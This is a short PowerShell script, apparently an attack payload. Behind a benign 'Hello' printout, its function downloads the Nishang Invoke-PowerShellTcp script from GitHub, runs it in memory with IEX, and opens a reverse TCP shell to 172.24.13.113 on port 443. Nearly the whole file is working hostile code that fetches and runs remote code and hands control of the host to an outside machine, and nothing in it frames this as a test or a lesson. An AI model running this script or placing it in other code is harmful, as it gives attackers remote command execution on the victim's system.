function RunThis(){
$wc = New-Object system.Net.Webclient
IEX $wc.downloadstring("https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1")
Invoke-PowerShellTcp -Reverse -IPAddress 172.24.13.113 -Port 443
}

write-host "Hello"
RunThis
